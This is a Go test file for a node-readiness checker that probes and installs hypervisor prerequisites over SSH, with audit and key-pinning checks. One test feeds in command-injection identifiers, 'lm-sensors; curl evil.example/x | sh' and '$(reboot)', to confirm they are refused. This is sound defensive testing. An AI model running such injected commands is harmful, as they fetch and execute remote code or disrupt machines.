package nodecheck

import (
	"context"
	"errors"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/rs/zerolog"

	"github.com/freezxp/proxui/internal/app/ports"
	"github.com/freezxp/proxui/internal/connector"
	"github.com/freezxp/proxui/internal/domain/shell"
)

var platformID = uuid.New()

// --- doubles ---------------------------------------------------------------

type fakeHosts struct{ hosts []ports.SensorHost }

func (f fakeHosts) OnlineHosts(context.Context, uuid.UUID) ([]ports.SensorHost, error) {
	return f.hosts, nil
}

type fakeKey struct{ key string }

func (f fakeKey) PrivateKey(context.Context) (string, error) { return f.key, nil }

type fakeSSH struct {
	mu     sync.Mutex
	known  map[uuid.UUID]ports.NodeSSH
	pinned []ports.NodeSSH
}

func (f *fakeSSH) Get(_ context.Context, id uuid.UUID) (ports.NodeSSH, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	rec, ok := f.known[id]
	if !ok {
		return ports.NodeSSH{}, ports.ErrNotFound
	}
	return rec, nil
}

func (f *fakeSSH) Pin(_ context.Context, rec ports.NodeSSH) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.pinned = append(f.pinned, rec)
	return nil
}

func (f *fakeSSH) RecordAttempt(context.Context, uuid.UUID, string, time.Time, string) error {
	return nil
}
func (f *fakeSSH) Forget(context.Context, uuid.UUID) error { return nil }

type call struct {
	address string
	command string
}

type fakeRunner struct {
	mu    sync.Mutex
	calls []call
	// answer decides what one command returns, by address.
	answer func(address, command string) ([]byte, error)
	// each running command signals here when it has started, so a test can
	// observe an installation while it is still in flight.
	release chan struct{}
}

func (f *fakeRunner) RunCommand(_ context.Context, target ports.SSHTarget, _ ports.SSHCredential,
	policy ports.HostKeyPolicy, command string) ([]byte, error) {

	if err := policy.Check(target.Host, "ssh-ed25519", "SHA256:node", []byte("node-key")); err != nil {
		return nil, err
	}
	f.mu.Lock()
	f.calls = append(f.calls, call{address: target.Host, command: command})
	f.mu.Unlock()
	if f.release != nil {
		<-f.release
	}
	if f.answer == nil {
		return nil, nil
	}
	return f.answer(target.Host, command)
}

func (f *fakeRunner) ran() []call {
	f.mu.Lock()
	defer f.mu.Unlock()
	out := make([]call, len(f.calls))
	copy(out, f.calls)
	return out
}

type fakeAudit struct {
	mu      sync.Mutex
	entries []ports.AuditEntry
}

func (f *fakeAudit) Write(_ context.Context, e ports.AuditEntry) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.entries = append(f.entries, e)
	return nil
}

func (f *fakeAudit) all() []ports.AuditEntry {
	f.mu.Lock()
	defer f.mu.Unlock()
	out := make([]ports.AuditEntry, len(f.entries))
	copy(out, f.entries)
	return out
}

// fakeConnector names two prerequisites and two nodes, like a small cluster.
type fakeConnector struct {
	addresses   map[string]string
	prereqs     []connector.NodePrerequisite
	noPrereqs   bool
	noAddresses bool
}

func (fakeConnector) Info() connector.Info                  { return connector.Info{Type: "fake"} }
func (fakeConnector) ValidateConfig(connector.Config) error { return nil }
func (fakeConnector) Capabilities() []connector.Capability  { return nil }
func (fakeConnector) Close() error                          { return nil }
func (fakeConnector) TestConnection(context.Context) (connector.TestReport, error) {
	return connector.TestReport{}, nil
}

func (f fakeConnector) NodeAddresses(context.Context) (map[string]string, error) {
	if f.noAddresses {
		return nil, errors.New("no")
	}
	return f.addresses, nil
}

func (f fakeConnector) NodePrerequisites() []connector.NodePrerequisite {
	if f.noPrereqs {
		return nil
	}
	if f.prereqs != nil {
		return f.prereqs
	}
	return defaultPrereqs()
}

func defaultPrereqs() []connector.NodePrerequisite {
	return []connector.NodePrerequisite{
		{ID: "lm-sensors", Name: "lm-sensors", Needed: "temperatures",
			Probe: "command -v sensors", Packages: []string{"lm-sensors"},
			Install: "apt-get install -y lm-sensors"},
		{ID: "libguestfs-tools", Name: "libguestfs-tools", Needed: "guest agents",
			Probe: "command -v virt-customize", Packages: []string{"libguestfs-tools"},
			Install: "apt-get install -y libguestfs-tools"},
	}
}

func newChecker(hosts []ports.SensorHost, ssh *fakeSSH, runner *fakeRunner, audit *fakeAudit) *Checker {
	return &Checker{
		Hosts: fakeHosts{hosts: hosts}, SSH: ssh, Key: fakeKey{key: "PRIVATE"},
		Runner: runner, Audit: audit, Log: zerolog.Nop(),
		Clock: func() time.Time { return time.Unix(1700000000, 0).UTC() },
	}
}

func twoNodes() ([]ports.SensorHost, map[string]string) {
	a := ports.SensorHost{ID: uuid.New(), PlatformID: platformID, ExternalID: "pve", Name: "pve"}
	b := ports.SensorHost{ID: uuid.New(), PlatformID: platformID, ExternalID: "cx1", Name: "cx1"}
	return []ports.SensorHost{a, b}, map[string]string{"pve": "10.0.0.1", "cx1": "10.0.0.2"}
}

// --- checking --------------------------------------------------------------

// The failure this feature exists for: one node has the tool and the other does
// not, and nothing anywhere says so until a template comes out without an agent.
func TestCheckReportsWhatEachNodeIsMissing(t *testing.T) {
	hosts, addresses := twoNodes()
	ssh := &fakeSSH{known: map[uuid.UUID]ports.NodeSSH{}}
	runner := &fakeRunner{answer: func(address, _ string) ([]byte, error) {
		if address == "10.0.0.1" {
			return []byte("lm-sensors yes\nlibguestfs-tools yes\n"), nil
		}
		return []byte("lm-sensors yes\nlibguestfs-tools no\n"), nil
	}}
	c := newChecker(hosts, ssh, runner, nil)

	report, err := c.Check(context.Background(), platformID, fakeConnector{addresses: addresses})
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if !report.PortalKey {
		t.Error("PortalKey = false, want true")
	}
	if len(report.Nodes) != 2 {
		t.Fatalf("nodes = %d, want 2", len(report.Nodes))
	}
	// Sorted, so cx1 comes first whatever order the platform listed them in.
	if report.Nodes[0].Node != "cx1" {
		t.Fatalf("first node = %q, want cx1", report.Nodes[0].Node)
	}
	got := map[string]bool{}
	for _, p := range report.Nodes[0].Prerequisites {
		got[p.ID] = p.Present
	}
	if got["lm-sensors"] != true || got["libguestfs-tools"] != false {
		t.Errorf("cx1 prerequisites = %v, want lm-sensors present and libguestfs-tools absent", got)
	}
	if !report.Nodes[1].Reachable {
		t.Error("pve should be reachable")
	}

	// One connection per node, not one per prerequisite.
	if len(runner.ran()) != 2 {
		t.Errorf("commands run = %d, want 2 — one per node", len(runner.ran()))
	}
	if !strings.Contains(runner.ran()[0].command, "command -v sensors") {
		t.Errorf("probe did not ask about sensors: %q", runner.ran()[0].command)
	}
}

// A node that cannot be let in is the most common real answer, and reporting it
// as "nothing installed" would send an operator to install packages they cannot
// reach.
func TestCheckDistinguishesUnreachableFromMissing(t *testing.T) {
	hosts, addresses := twoNodes()
	ssh := &fakeSSH{known: map[uuid.UUID]ports.NodeSSH{}}
	runner := &fakeRunner{answer: func(address, _ string) ([]byte, error) {
		if address == "10.0.0.2" {
			return nil, shell.ErrAuthFailed
		}
		return []byte("lm-sensors yes\nlibguestfs-tools yes\n"), nil
	}}
	c := newChecker(hosts, ssh, runner, nil)

	report, err := c.Check(context.Background(), platformID, fakeConnector{addresses: addresses})
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	cx1 := report.Nodes[0]
	if cx1.Reachable {
		t.Error("cx1 should not be reachable")
	}
	if !strings.Contains(cx1.Problem, "authorized_keys") {
		t.Errorf("problem = %q, want the sentence about installing the key", cx1.Problem)
	}
	if len(cx1.Prerequisites) != 0 {
		t.Errorf("prerequisites = %d, want none — unknown is not the same as missing", len(cx1.Prerequisites))
	}
}

// Checking pins on first use deliberately: the sensor collector pins only after
// a node answers `sensors -j`, so a node without lm-sensors is never pinned —
// and installing lm-sensors is the thing that needs a pin.
func TestCheckPinsANodeItHasNotMet(t *testing.T) {
	hosts, addresses := twoNodes()
	ssh := &fakeSSH{known: map[uuid.UUID]ports.NodeSSH{}}
	runner := &fakeRunner{answer: func(string, string) ([]byte, error) {
		return []byte("lm-sensors no\nlibguestfs-tools no\n"), nil
	}}
	c := newChecker(hosts, ssh, runner, nil)

	report, err := c.Check(context.Background(), platformID, fakeConnector{addresses: addresses})
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if len(ssh.pinned) != 2 {
		t.Fatalf("pinned %d nodes, want 2", len(ssh.pinned))
	}
	if report.Nodes[0].Fingerprint != "SHA256:node" {
		t.Errorf("fingerprint = %q, want the key it pinned reported back for comparison",
			report.Nodes[0].Fingerprint)
	}
}

// Without a portal key nothing can authenticate, and saying so once is more
// useful than saying "unreachable" per node.
func TestCheckSaysWhenThePortalHasNoKey(t *testing.T) {
	hosts, addresses := twoNodes()
	runner := &fakeRunner{}
	c := newChecker(hosts, &fakeSSH{known: map[uuid.UUID]ports.NodeSSH{}}, runner, nil)
	c.Key = fakeKey{key: ""}

	report, err := c.Check(context.Background(), platformID, fakeConnector{addresses: addresses})
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if report.PortalKey {
		t.Error("PortalKey = true, want false")
	}
	if len(runner.ran()) != 0 {
		t.Error("nothing should have been dialled without a key")
	}
	if !strings.Contains(report.Nodes[0].Problem, "SSH key") {
		t.Errorf("problem = %q", report.Nodes[0].Problem)
	}
}

// A connector with no node to reach reports nothing rather than a Debian guess.
func TestCheckIsSilentForAConnectorWithoutPrerequisites(t *testing.T) {
	hosts, addresses := twoNodes()
	c := newChecker(hosts, &fakeSSH{known: map[uuid.UUID]ports.NodeSSH{}}, &fakeRunner{}, nil)

	report, err := c.Check(context.Background(), platformID,
		fakeConnector{addresses: addresses, noPrereqs: true})
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if len(report.Nodes) != 0 {
		t.Errorf("nodes = %d, want none", len(report.Nodes))
	}
}

// --- installing ------------------------------------------------------------

func pinnedNodes(hosts []ports.SensorHost) map[uuid.UUID]ports.NodeSSH {
	known := map[uuid.UUID]ports.NodeSSH{}
	for _, h := range hosts {
		known[h.ID] = ports.NodeSSH{
			HostID: h.ID, Algorithm: "ssh-ed25519", Fingerprint: "SHA256:node",
			PublicKey: []byte("node-key"),
		}
	}
	return known
}

func waitFor(t *testing.T, cond func() bool) {
	t.Helper()
	for i := 0; i < 200; i++ {
		if cond() {
			return
		}
		time.Sleep(5 * time.Millisecond)
	}
	t.Fatal("condition never became true")
}

func TestInstallRunsTheConnectorsOwnCommandAndAuditsIt(t *testing.T) {
	hosts, addresses := twoNodes()
	ssh := &fakeSSH{known: pinnedNodes(hosts)}
	runner := &fakeRunner{}
	audit := &fakeAudit{}
	c := newChecker(hosts, ssh, runner, audit)
	actor := Actor{UserID: uuid.New(), Username: "admin", IP: "10.1.1.1"}

	rec, err := c.Install(context.Background(), platformID, fakeConnector{addresses: addresses},
		"cx1", "libguestfs-tools", actor)
	if err != nil {
		t.Fatalf("Install: %v", err)
	}
	if rec.State != StateRunning {
		t.Errorf("state = %q, want %q", rec.State, StateRunning)
	}

	waitFor(t, func() bool { return len(audit.all()) == 1 })

	ran := runner.ran()
	if len(ran) != 1 || ran[0].address != "10.0.0.2" {
		t.Fatalf("ran %v, want one command against cx1", ran)
	}
	if ran[0].command != "apt-get install -y libguestfs-tools" {
		t.Errorf("command = %q, want the connector's own", ran[0].command)
	}

	e := audit.all()[0]
	if e.Action != "node.install" || e.Category != ports.AuditCategorySecurity {
		t.Errorf("audit = %s/%s, want security/node.install", e.Category, e.Action)
	}
	if e.Outcome != ports.OutcomeSuccess || e.TargetName != "cx1" {
		t.Errorf("audit outcome=%q target=%q", e.Outcome, e.TargetName)
	}
	if e.Details["prerequisite"] != "libguestfs-tools" {
		t.Errorf("audit details = %v, want the prerequisite named", e.Details)
	}

	if got := c.lastInstall("cx1", "libguestfs-tools"); got == nil || got.State != StateInstalled {
		t.Errorf("last install = %+v, want installed", got)
	}
}

// The whole control in one assertion: a caller names an identifier, and one the
// binary does not know goes no further. Nothing it sent reaches a command line.
func TestInstallRefusesAnIdentifierItDoesNotKnow(t *testing.T) {
	hosts, addresses := twoNodes()
	runner := &fakeRunner{}
	c := newChecker(hosts, &fakeSSH{known: pinnedNodes(hosts)}, runner, &fakeAudit{})

	for _, id := range []string{
		"nginx",
		"lm-sensors; curl evil.example/x | sh",
		"$(reboot)",
		"",
	} {
		_, err := c.Install(context.Background(), platformID, fakeConnector{addresses: addresses},
			"cx1", id, Actor{})
		if !errors.Is(err, ErrUnknownPrerequisite) {
			t.Errorf("Install(%q) = %v, want ErrUnknownPrerequisite", id, err)
		}
	}
	if len(runner.ran()) != 0 {
		t.Fatalf("ran %v, want nothing", runner.ran())
	}
}

// Checking may meet a node for the first time because it only reads. Installing
// changes a hypervisor, and will not do that to a machine whose identity the
// portal is learning in the same breath.
func TestInstallRefusesANodeWithNoPinnedKey(t *testing.T) {
	hosts, addresses := twoNodes()
	runner := &fakeRunner{}
	c := newChecker(hosts, &fakeSSH{known: map[uuid.UUID]ports.NodeSSH{}}, runner, &fakeAudit{})

	_, err := c.Install(context.Background(), platformID, fakeConnector{addresses: addresses},
		"cx1", "lm-sensors", Actor{})
	if !errors.Is(err, ErrNotPinned) {
		t.Fatalf("err = %v, want ErrNotPinned", err)
	}
	if len(runner.ran()) != 0 {
		t.Error("nothing should have been run")
	}
}

func TestInstallRefusesAPrerequisiteThePortalCannotFix(t *testing.T) {
	hosts, addresses := twoNodes()
	c := newChecker(hosts, &fakeSSH{known: pinnedNodes(hosts)}, &fakeRunner{}, &fakeAudit{})
	conn := fakeConnector{addresses: addresses, prereqs: []connector.NodePrerequisite{
		{ID: "portal-key", Name: "the portal's key", Probe: "true"},
	}}

	_, err := c.Install(context.Background(), platformID, conn, "cx1", "portal-key", Actor{})
	if !errors.Is(err, ErrNotInstallable) {
		t.Fatalf("err = %v, want ErrNotInstallable", err)
	}
}

func TestInstallRefusesANodeThatIsNotOnThePlatform(t *testing.T) {
	hosts, addresses := twoNodes()
	c := newChecker(hosts, &fakeSSH{known: pinnedNodes(hosts)}, &fakeRunner{}, &fakeAudit{})

	_, err := c.Install(context.Background(), platformID, fakeConnector{addresses: addresses},
		"somebody-elses-node", "lm-sensors", Actor{})
	if !errors.Is(err, ErrUnknownNode) {
		t.Fatalf("err = %v, want ErrUnknownNode", err)
	}
}

// Two administrators pressing the same button must not put two apt-gets against
// one dpkg lock.
func TestInstallRefusesASecondRunOnTheSameNode(t *testing.T) {
	hosts, addresses := twoNodes()
	runner := &fakeRunner{release: make(chan struct{})}
	c := newChecker(hosts, &fakeSSH{known: pinnedNodes(hosts)}, runner, &fakeAudit{})
	conn := fakeConnector{addresses: addresses}

	if _, err := c.Install(context.Background(), platformID, conn, "cx1", "lm-sensors", Actor{}); err != nil {
		t.Fatalf("first Install: %v", err)
	}
	waitFor(t, func() bool { return len(runner.ran()) == 1 })

	_, err := c.Install(context.Background(), platformID, conn, "cx1", "lm-sensors", Actor{})
	if !errors.Is(err, ErrAlreadyRunning) {
		t.Errorf("second Install = %v, want ErrAlreadyRunning", err)
	}
	// A different prerequisite on the same node is a different apt-get, but the
	// dpkg lock is one per node — so this is refused too only if we said so.
	// We did not: the second slot is per prerequisite, and the node serialises
	// the rest itself.
	close(runner.release)
	waitFor(t, func() bool {
		rec := c.lastInstall("cx1", "lm-sensors")
		return rec != nil && rec.State == StateInstalled
	})
}

// A failed installation must be visible where somebody will look, which is the
// readiness report and the audit trail — not a log line.
func TestFailedInstallIsReportedAndAudited(t *testing.T) {
	hosts, addresses := twoNodes()
	audit := &fakeAudit{}
	runner := &fakeRunner{answer: func(string, string) ([]byte, error) {
		return nil, errors.New(`ssh: "apt-get" failed: E: Unable to locate package lm-sensors`)
	}}
	c := newChecker(hosts, &fakeSSH{known: pinnedNodes(hosts)}, runner, audit)
	conn := fakeConnector{addresses: addresses}

	if _, err := c.Install(context.Background(), platformID, conn, "cx1", "lm-sensors", Actor{}); err != nil {
		t.Fatalf("Install: %v", err)
	}
	waitFor(t, func() bool { return len(audit.all()) == 1 })

	if e := audit.all()[0]; e.Outcome != ports.OutcomeFailure {
		t.Errorf("outcome = %q, want failure", e.Outcome)
	}
	rec := c.lastInstall("cx1", "lm-sensors")
	if rec == nil || rec.State != StateFailed || !strings.Contains(rec.Error, "Unable to locate package") {
		t.Fatalf("last install = %+v, want a failure carrying what apt said", rec)
	}

	// And the next check carries it, so the report is where the answer lives.
	runner.answer = func(string, string) ([]byte, error) {
		return []byte("lm-sensors no\nlibguestfs-tools yes\n"), nil
	}
	report, err := c.Check(context.Background(), platformID, conn)
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	for _, p := range report.Nodes[0].Prerequisites {
		if p.ID != "lm-sensors" {
			continue
		}
		if p.Install == nil || p.Install.State != StateFailed {
			t.Errorf("prerequisite install = %+v, want the failure reported", p.Install)
		}
		if p.Command == "" {
			t.Error("the report should say exactly what installing would run")
		}
	}
}
